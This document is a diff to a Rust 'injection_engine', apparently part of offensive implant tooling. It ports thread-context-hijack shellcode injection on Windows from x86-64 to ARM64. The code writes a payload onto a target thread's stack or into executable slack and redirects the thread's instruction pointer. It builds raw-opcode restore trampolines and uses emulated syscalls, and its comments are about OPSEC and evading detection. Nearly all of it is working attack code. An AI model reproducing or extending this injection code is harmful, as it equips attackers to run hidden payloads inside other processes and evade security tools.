@@ -7748,16 +7748,16 @@ fn inject_context_only(
             cleanup_and_err!("NtGetContextThread failed");
         }
 
-        let original_rip = ctx.Rip;
-        let original_rsp = ctx.Rsp;
-        let original_rbp = ctx.Rbp;
+        let original_ip = context_ip(&ctx);
+        let original_sp = context_sp(&ctx);
+        let original_fp = context_fp(&ctx);
 
         log::debug!(
-            "injection_engine: ContextOnly: thread {} original context: RIP={:#x} RSP={:#x} RBP={:#x}",
+            "injection_engine: ContextOnly: thread {} original context: IP={:#x} SP={:#x} FP={:#x}",
             candidate_tid,
-            original_rip,
-            original_rsp,
-            original_rbp,
+            original_ip,
+            original_sp,
+            original_fp,
         );
 
         // ── Step 5: Write payload + trampoline ──────────────────────────
@@ -7777,7 +7777,7 @@ fn inject_context_only(
         //   push imm64 (sign-ext)   → 68 <4 bytes>  (if fits in i32) OR
         //   mov rax, imm64; push rax → 48 B8 <8 bytes> 50
 
-        let trampoline = build_restore_trampoline(original_rip, original_rsp, original_rbp);
+        let trampoline = build_restore_trampoline(original_ip, original_sp, original_fp);
 
         // Combined payload = shellcode + trampoline
         let mut combined = payload.to_vec();
@@ -7794,8 +7794,8 @@ fn inject_context_only(
             // NtWriteVirtualMemory call to the stack, which is less flagged
             // than allocating new executable memory.
 
-            let stack_write_addr = if original_rsp > STACK_WRITE_OFFSET as u64 {
-                original_rsp - STACK_WRITE_OFFSET as u64
+            let stack_write_addr = if original_sp > STACK_WRITE_OFFSET as u64 {
+                original_sp - STACK_WRITE_OFFSET as u64
             } else {
                 // Stack is too small — fall back.
                 let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
@@ -7807,11 +7807,11 @@ fn inject_context_only(
 
             log::debug!(
                 "injection_engine: ContextOnly: Method A (stack), writing {} bytes at {:#x} \
-                 (RSP={:#x}, offset=0x{:x})",
+                 (SP={:#x}, offset=0x{:x})",
                 combined_len,
                 stack_write_addr,
-                original_rsp,
-                original_rsp - stack_write_addr,
+                original_sp,
+                original_sp - stack_write_addr,
             );
 
             (stack_write_addr as usize, "stack")
@@ -7837,8 +7837,8 @@ fn inject_context_only(
                     // No executable slack found. Fall back to stack delivery
                     // even for larger payloads (the stack is typically large
                     // enough, we just prefer stack for small payloads).
-                    let stack_write_addr = if original_rsp > STACK_WRITE_OFFSET as u64 {
-                        (original_rsp - STACK_WRITE_OFFSET as u64) & !0xF
+                    let stack_write_addr = if original_sp > STACK_WRITE_OFFSET as u64 {
+                        (original_sp - STACK_WRITE_OFFSET as u64) & !0xF
                     } else {
                         let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
                         cleanup_and_err!(
@@ -7878,11 +7878,10 @@ fn inject_context_only(
 
         // ── Step 6: Modify the thread's CONTEXT ─────────────────────────
         //
-        // Set RIP to the payload address. For stack delivery, also adjust
-        // RSP to point above the payload (so the payload has stack space).
-        // RCX/RDX can carry arguments if the payload expects them.
+        // Set the instruction pointer to the payload address. For stack
+        // delivery, also adjust the stack pointer so the payload has room.
 
-        ctx.Rip = write_addr as u64;
+        set_context_ip(&mut ctx, write_addr as u64);
 
         // For stack delivery, set RSP to just below the payload so the
         // payload has room for its own stack frames above.
@@ -7890,7 +7889,7 @@ fn inject_context_only(
             // Set RSP to the write_addr minus some space for the payload's
             // own stack usage. The payload's trampoline will restore the
             // original RSP.
-            ctx.Rsp = (write_addr - 0x200) as u64; // 512 bytes for payload stack
+            set_context_sp(&mut ctx, (write_addr - 0x200) as u64); // 512 bytes for payload stack
         }
 
         // Flush I-cache for the written region (important for section delivery).
@@ -7909,9 +7908,9 @@ fn inject_context_only(
 
         if set_ctx_status.is_err() || set_ctx_status.unwrap() < 0 {
             // Failed to set context — try to restore and clean up.
-            ctx.Rip = original_rip;
-            ctx.Rsp = original_rsp;
-            ctx.Rbp = original_rbp;
+            set_context_ip(&mut ctx, original_ip);
+            set_context_sp(&mut ctx, original_sp);
+            set_context_fp(&mut ctx, original_fp);
             let _ = crate::emulated_syscall!(
                 "NtSetContextThread",
                 h_thread as u64,
@@ -7922,10 +7921,10 @@ fn inject_context_only(
         }
 
         log::info!(
-            "injection_engine: ContextOnly: set thread {} RIP={:#x}, RSP={:#x}",
+            "injection_engine: ContextOnly: set thread {} IP={:#x}, SP={:#x}",
             candidate_tid,
-            ctx.Rip,
-            ctx.Rsp,
+            context_ip(&ctx),
+            context_sp(&ctx),
         );
 
         // ── Step 7: Resume / signal the thread ──────────────────────────
@@ -7973,8 +7972,8 @@ fn inject_context_only(
         // at the end of the payload restores the original context, so the
         // thread should return to its original execution path.
         //
-        // We poll by periodically reading the thread's RIP via
-        // NtGetContextThread to see if it has returned to the original RIP
+        // We poll by periodically reading the thread's instruction pointer via
+        // NtGetContextThread to see if it has returned to the original IP
         // or near it (within the original module).
         let wait_start = std::time::Instant::now();
         let wait_timeout = std::time::Duration::from_secs(10);
@@ -7994,15 +7993,15 @@ fn inject_context_only(
             );
 
             if check_status.is_ok() && check_status.unwrap() >= 0 {
-                // Check if RIP has returned to the original location or is
+                // Check if IP has returned to the original location or is
                 // in a system call (which means the thread is back to normal).
-                let current_rip = check_ctx.Rip;
+                let current_ip = context_ip(&check_ctx);
 
-                // If RIP is back to original or in kernel space (high bits set),
+                // If IP is back to original or in kernel space (high bits set),
                 // the payload has completed.
-                if current_rip == original_rip
-                    || current_rip == 0
-                    || (current_rip & 0xFFF_0000_0000_0000) != 0
+                if current_ip == original_ip
+                    || current_ip == 0
+                    || (current_ip & 0xFFF_0000_0000_0000) != 0
                 {
                     payload_completed = true;
                     break;
@@ -8066,6 +8065,106 @@ fn inject_context_only(
     }
 }
 
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn context_ip(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    ctx.Rip
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn context_ip(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    ctx.Pc
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn set_context_ip(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    ctx.Rip = value;
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn set_context_ip(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    ctx.Pc = value;
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn context_sp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    ctx.Rsp
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn context_sp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    ctx.Sp
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn set_context_sp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    ctx.Rsp = value;
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn set_context_sp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    ctx.Sp = value;
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn context_fp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    ctx.Rbp
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn context_fp(ctx: &winapi::um::winnt::CONTEXT) -> u64 {
+    unsafe { ctx.u.s().Fp }
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn set_context_fp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    ctx.Rbp = value;
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn set_context_fp(ctx: &mut winapi::um::winnt::CONTEXT, value: u64) {
+    unsafe {
+        ctx.u.s_mut().Fp = value;
+    }
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn emit_aarch64_mov_imm64(out: &mut Vec<u8>, reg: u32, value: u64) {
+    let parts = [
+        (value & 0xFFFF) as u32,
+        ((value >> 16) & 0xFFFF) as u32,
+        ((value >> 32) & 0xFFFF) as u32,
+        ((value >> 48) & 0xFFFF) as u32,
+    ];
+    for (idx, imm) in parts.iter().enumerate() {
+        let base = if idx == 0 { 0xD280_0000 } else { 0xF280_0000 };
+        let word = base | ((idx as u32) << 21) | (imm << 5) | reg;
+        out.extend_from_slice(&word.to_le_bytes());
+    }
+}
+
+/// Build an architecture-native restore trampoline that restores the thread's
+/// original stack/frame state and returns to the original instruction pointer.
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn build_restore_trampoline(original_ip: u64, original_sp: u64, original_fp: u64) -> Vec<u8> {
+    build_restore_trampoline_x86_64(original_ip, original_sp, original_fp)
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn build_restore_trampoline(original_ip: u64, original_sp: u64, original_fp: u64) -> Vec<u8> {
+    let mut trampoline = Vec::with_capacity(64);
+
+    emit_aarch64_mov_imm64(&mut trampoline, 16, original_sp);
+    // add sp, x16, #0
+    trampoline.extend_from_slice(&(0x9100_0000u32 | (16 << 5) | 31).to_le_bytes());
+
+    emit_aarch64_mov_imm64(&mut trampoline, 29, original_fp);
+    emit_aarch64_mov_imm64(&mut trampoline, 16, original_ip);
+    // br x16
+    trampoline.extend_from_slice(&(0xD61F_0000u32 | (16 << 5)).to_le_bytes());
+
+    trampoline
+}
+
 /// Build an x86-64 restore trampoline that restores the thread's original
 /// RSP, RBP, and returns to the original RIP.
 ///
@@ -8075,7 +8174,12 @@ fn inject_context_only(
 ///   mov rax, <original_rip>      ; push requires sign-extended imm32;
 ///   push rax                      ; so we use movabs+push for generality
 ///   ret
-fn build_restore_trampoline(original_rip: u64, original_rsp: u64, original_rbp: u64) -> Vec<u8> {
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn build_restore_trampoline_x86_64(
+    original_rip: u64,
+    original_rsp: u64,
+    original_rbp: u64,
+) -> Vec<u8> {
     let mut trampoline = Vec::with_capacity(48);
 
     // mov rsp, <original_rsp>  → 48 BC <imm64>
@@ -8628,9 +8732,9 @@ fn inject_waiting_thread_hijack(
         }
         let h_thread = h_thread as *mut c_void;
 
-        // ── Step 4: Read the thread's current RSP (CONTEXT read) ────────
+        // ── Step 4: Read the thread's current stack pointer (CONTEXT read) ─
         //
-        // We use NtGetContextThread only to read the current RSP — we do
+        // We use NtGetContextThread only to read the current stack pointer — we do
         // NOT modify the CONTEXT (no NtSetContextThread call). This is
         // critical for OPSEC.
         let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
@@ -8644,13 +8748,13 @@ fn inject_waiting_thread_hijack(
 
         if get_ctx_status.is_err() || get_ctx_status.unwrap() < 0 {
             let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
-            cleanup_and_err!("NtGetContextThread failed (read RSP only)");
+            cleanup_and_err!("NtGetContextThread failed (read stack pointer only)");
         }
 
-        let thread_rsp = ctx.Rsp;
+        let thread_rsp = context_sp(&ctx);
 
         log::debug!(
-            "injection_engine: WTH: thread {} RSP={:#x}",
+            "injection_engine: WTH: thread {} SP={:#x}",
             candidate.tid,
             thread_rsp,
         );
@@ -8872,7 +8976,7 @@ fn inject_waiting_thread_hijack(
         // ── Step 9: Wait for payload completion ─────────────────────────
         //
         // Wait up to 15 seconds for the payload to complete. We poll the
-        // thread's RIP to detect when it has returned to the original caller.
+        // thread's instruction pointer to detect when it has returned to the original caller.
         let wait_start = std::time::Instant::now();
         let wait_timeout = std::time::Duration::from_secs(15);
         let mut payload_completed = false;
@@ -8890,13 +8994,13 @@ fn inject_waiting_thread_hijack(
             );
 
             if check_status.is_ok() && check_status.unwrap() >= 0 {
-                let current_rip = check_ctx.Rip;
+                let current_ip = context_ip(&check_ctx);
 
-                // If RIP is at or near the original return address, the
+                // If IP is at or near the original return address, the
                 // payload has completed and the trampoline has returned.
-                if current_rip == original_return_addr
-                    || current_rip == 0
-                    || (current_rip & 0xFFF_0000_0000_0000) != 0
+                if current_ip == original_return_addr
+                    || current_ip == 0
+                    || (current_ip & 0xFFF_0000_0000_0000) != 0
                 {
                     payload_completed = true;
                     break;
